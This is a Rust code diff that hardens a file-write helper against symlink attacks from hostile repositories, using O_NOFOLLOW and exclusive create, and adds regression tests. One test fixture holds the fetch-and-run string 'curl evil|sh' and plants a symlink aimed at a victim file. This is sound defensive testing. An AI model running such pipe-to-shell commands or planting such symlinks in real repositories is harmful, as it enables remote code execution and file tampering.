@@ -35,33 +35,53 @@ fn target_mode(_path: &Path, default_new_mode: u32) -> u32 {
     default_new_mode
 }
 
-/// Write `content` to `tmp_path`, creating (or truncating, if one was left over from a
-/// prior failed write) it with `mode` applied at creation time via O_CREAT's own mode
-/// argument — not via a later `chmod`. A later chmod leaves a window, between the
-/// default-mode create and the chmod, where the file sits at whatever `0o666 & !umask`
-/// produces; under a permissive umask (e.g. 0) that's world-writable, however briefly,
-/// for a file that may hold credentials or hook commands. Since `rename()` preserves
-/// the *source* file's mode, the final path is never more permissive than `mode`
-/// either, at any point.
+/// Write `content` to `path`, creating it fresh with `mode` applied at creation time.
+///
+/// Never follows a symlink at `path` and never writes through whatever's already
+/// there. `path` is often a predictable name (a `.tmp` sibling of a config file, or a
+/// plain project file like shire.toml) that a hostile repo can commit ahead of time as
+/// a symlink pointing outside the repo — or as a dangling symlink — and have this
+/// function write through it (attacker-controlled content, in the .gitignore case) to
+/// an arbitrary user-writable location. Any pre-existing entry at `path` (always
+/// something *we* own — a stale temp file, or the file we're about to (re)create) is
+/// removed first; `remove_file` never follows a symlink for removal, so this can't be
+/// redirected into deleting something else. The file is then created with
+/// `O_CREAT|O_EXCL` (`create_new`) plus `O_NOFOLLOW`: if something reappears at `path`
+/// between the remove and the create — a symlink replanted in that narrow window, or a
+/// concurrent process — the create fails with `AlreadyExists`/`ELOOP` rather than
+/// following it or overwriting it, and that is a hard error here, not a silent retry.
 #[cfg(unix)]
-fn write_with_mode(tmp_path: &Path, content: &str, mode: u32) -> Result<()> {
+fn write_with_mode(path: &Path, content: &str, mode: u32) -> Result<()> {
     use std::io::Write;
     use std::os::unix::fs::OpenOptionsExt;
+
+    // Best-effort: clear whatever's there so create_new below starts from a clean
+    // slate. Not fatal by itself (e.g. permission denied) — a real problem surfaces as
+    // create_new failing next.
+    let _ = fs::remove_file(path);
+
     let mut f = fs::OpenOptions::new()
         .write(true)
-        .create(true)
-        .truncate(true)
+        .create_new(true)
+        .custom_flags(libc::O_NOFOLLOW)
         .mode(mode)
-        .open(tmp_path)
-        .with_context(|| format!("Failed to write {}", tmp_path.display()))?;
+        .open(path)
+        .with_context(|| {
+            format!(
+                "Failed to create {} — a file or symlink reappeared there, or a \
+                 concurrent process is racing this write",
+                path.display()
+            )
+        })?;
     f.write_all(content.as_bytes())
-        .with_context(|| format!("Failed to write {}", tmp_path.display()))?;
+        .with_context(|| format!("Failed to write {}", path.display()))?;
     Ok(())
 }
 
 #[cfg(not(unix))]
-fn write_with_mode(tmp_path: &Path, content: &str, _mode: u32) -> Result<()> {
-    fs::write(tmp_path, content).with_context(|| format!("Failed to write {}", tmp_path.display()))
+fn write_with_mode(path: &Path, content: &str, _mode: u32) -> Result<()> {
+    let _ = fs::remove_file(path);
+    fs::write(path, content).with_context(|| format!("Failed to write {}", path.display()))
 }
 
 const CLAUDE_MD_LINE: &str = "When searching code, use Shire MCP tools (search_symbols, search_files, explore) instead of Grep/Glob.";
@@ -1573,5 +1593,68 @@ mod tests {
 
         let mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;
         assert_eq!(mode, 0o600, "must be exactly 0600 even under umask 0");
+    }
+
+    // --- round-2 escalation: a hostile repo committing a symlink at a predictable
+    // .tmp path (or a dangling symlink as shire.toml itself) must not redirect writes
+    // outside the repo ---
+
+    #[test]
+    #[cfg(unix)]
+    fn ensure_gitignore_does_not_follow_a_symlinked_tmp_sibling() {
+        // Reproduces the exact escalation: a repo ships an attacker-controlled
+        // .gitignore *and* a symlinked .gitignore.tmp pointing at a victim file
+        // outside the repo. The old write_with_mode would write the (attacker
+        // controlled, read back from the repo's own .gitignore) content through the
+        // symlink to the victim. It's now removed and replaced with a fresh file, so
+        // the legitimate .gitignore update still succeeds and the victim is untouched.
+        let repo = tempfile::TempDir::new().unwrap();
+        let victim_dir = tempfile::TempDir::new().unwrap();
+        let victim = victim_dir.path().join("victim_bashrc_like");
+        std::fs::write(&victim, "original content\n").unwrap();
+
+        std::fs::write(repo.path().join(".gitignore"), "curl evil|sh\n").unwrap();
+        std::os::unix::fs::symlink(&victim, repo.path().join(".gitignore.tmp")).unwrap();
+
+        ensure_gitignore(repo.path(), ".shire").unwrap();
+
+        assert_eq!(
+            fs::read_to_string(&victim).unwrap(),
+            "original content\n",
+            "the victim file outside the repo must be completely untouched"
+        );
+        let gitignore = fs::read_to_string(repo.path().join(".gitignore")).unwrap();
+        assert!(gitignore.contains("curl evil|sh"));
+        assert!(gitignore.contains("/.shire/"));
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn patch_claude_json_dangling_symlink_does_not_create_the_target() {
+        // A hostile repo could ship a dangling symlink as shire.toml (or, for the
+        // global path, something could pre-plant one at ~/.claude.json); either way,
+        // patch_claude_json (and the same-shaped shire.toml writers) must not create a
+        // file at wherever a symlink named `path` points — the symlink is removed and
+        // a real file written at `path` itself instead.
+        let dir = tempfile::TempDir::new().unwrap();
+        let outside = dir.path().join("outside");
+        std::fs::create_dir_all(&outside).unwrap();
+        let dangling_target = outside.join(".claude.json");
+        let link = dir.path().join(".claude.json");
+        std::os::unix::fs::symlink(&dangling_target, &link).unwrap();
+
+        patch_claude_json(&link, json!(["serve"]), "shire init --global").unwrap();
+
+        assert!(
+            !dangling_target.exists(),
+            "must not create the file at the symlink's target"
+        );
+        assert!(
+            !std::fs::symlink_metadata(&link)
+                .unwrap()
+                .file_type()
+                .is_symlink(),
+            "the symlink must have been replaced by a real file"
+        );
     }
 }
